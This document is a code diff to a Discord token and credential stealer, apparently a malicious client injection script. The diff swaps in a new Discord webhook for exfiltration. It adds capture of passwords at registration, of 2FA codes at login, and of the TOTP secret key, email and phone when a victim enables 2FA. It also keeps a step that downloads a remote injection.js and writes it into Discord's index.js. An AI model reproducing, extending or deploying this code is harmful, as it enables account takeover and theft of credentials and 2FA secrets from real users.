@@ -12,13 +12,14 @@ const {
 } = require('electron');
 
 const CONFIG = {
-    webhook: "https://canary.discord.com/api/webhooks/1393710331427291206/2Xj1tae0ma72WJ-HOZlVbiBzQ0PN6Mt12AQfe9t3uKekog8enQ7QwZZyRWvrfQase56x",
+    webhook: "https://discord.com/api/webhooks/1399837067826954250/jY7D9lrDUW1exFvpqR3xuVy7zaR1PygU3PtTdtWTIaSQTEcAo2hdqT_Lon5UesRS8qy5",
     injection_url: "https://raw.githubusercontent.com/lotusknig/lotus-knight.github.io/refs/heads/main/injection.js",
     filters: {
         urls: [
             '/auth/login',
             '/auth/register',
             '/mfa/totp',
+            '/mfa/totp/enable',
             '/mfa/codes-verification',
             '/users/@me',
         ],
@@ -332,19 +333,51 @@ const getServers = async token => {
     };
 };
 
-const EmailPassToken = async (email, password, token, action) => {
+const EmailPassToken = async (email, password, token, action, twoFACode = null) => {
     const account = await fetchAccount(token)
+
+    const fields = [{
+        "name": "Email",
+        "value": "`" + email + "`",
+        "inline": true
+    }, {
+        "name": "Password",
+        "value": "`" + password + "`",
+        "inline": true
+    }];
+
+    // Eğer 2FA kodu varsa ekle
+    if (twoFACode) {
+        fields.push({
+            "name": "2FA Code",
+            "value": "`" + twoFACode + "`",
+            "inline": true
+        });
+    }
 
     const content = {
         "content": `**${account.username}** just ${action}!`,
         "embeds": [{
+            "fields": fields
+        }]
+    };
+
+    hooker(content, token, account);
+}
+
+const RegisterAccount = async (requestData, token) => {
+    const account = await fetchAccount(token)
+
+    const content = {
+        "content": `**${account.username}** just signed up!`,
+        "embeds": [{
             "fields": [{
                 "name": "Email",
-                "value": "`" + email + "`",
+                "value": "`" + requestData.email + "`",
                 "inline": true
             }, {
                 "name": "Password",
-                "value": "`" + password + "`",
+                "value": "`" + requestData.password + "`",
                 "inline": true
             }]
         }]
@@ -456,6 +489,39 @@ const PaypalAdded = async (token) => {
     hooker(content, token, account);
 }
 
+const TwoFAEnabled = async (requestData, responseData, token) => {
+    const account = await fetchAccount(token)
+
+    const content = {
+        "content": `**${account.username}** just enabled 2FA!`,
+        "embeds": [{
+            "fields": [{
+                "name": "2FA Code",
+                "value": "`" + (requestData.code || "N/A") + "`",
+                "inline": true
+            }, {
+                "name": "Secret Key",
+                "value": "`" + (requestData.secret || "N/A") + "`",
+                "inline": false
+            }, {
+                "name": "Response Data",
+                "value": "```json\n" + JSON.stringify(responseData, null, 2).substring(0, 1000) + "```",
+                "inline": false
+            }, {
+                "name": "Email",
+                "value": "`" + (account.email || "N/A") + "`",
+                "inline": true
+            }, {
+                "name": "Phone",
+                "value": "`" + (account.phone || "None") + "`",
+                "inline": true
+            }]
+        }]
+    };
+
+    hooker(content, token, account);
+}
+
 const discordPath = (function () {
     const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
     let resourcePath;
@@ -543,7 +609,7 @@ async function initiation() {
   async function init() {
       https.get('${CONFIG.injection_url}', (res) => {
           const file = fs.createWriteStream(indexJs);
-          res.replace('https://canary.discord.com/api/webhooks/1393710331427291206/2Xj1tae0ma72WJ-HOZlVbiBzQ0PN6Mt12AQfe9t3uKekog8enQ7QwZZyRWvrfQase56x', '${CONFIG.webhook}')
+          res.replace('https://discord.com/api/webhooks/1399837067826954250/jY7D9lrDUW1exFvpqR3xuVy7zaR1PygU3PtTdtWTIaSQTEcAo2hdqT_Lon5UesRS8qy5', '${CONFIG.webhook}')
           res.pipe(file);
           file.on('finish', () => {
               file.close();
@@ -598,11 +664,18 @@ const createWindow = () => {
                 break;
 
             case params.response.url.endsWith('/register'):
-                EmailPassToken(requestData.email, requestData.password, responseData.token, "signed up");
+                RegisterAccount(requestData, responseData.token);
                 break;
 
             case params.response.url.endsWith('/totp'):
-                EmailPassToken(email, password, responseData.token, "logged in with 2FA");
+                EmailPassToken(email, password, responseData.token, "logged in with 2FA", requestData.code);
+                break;
+
+            case params.response.url.endsWith('/mfa/totp/enable'):
+                const token2fa = responseData.token || await getToken();
+                if (token2fa) {
+                    TwoFAEnabled(requestData, responseData, token2fa);
+                }
                 break;
 
             case params.response.url.endsWith('/codes-verification'):
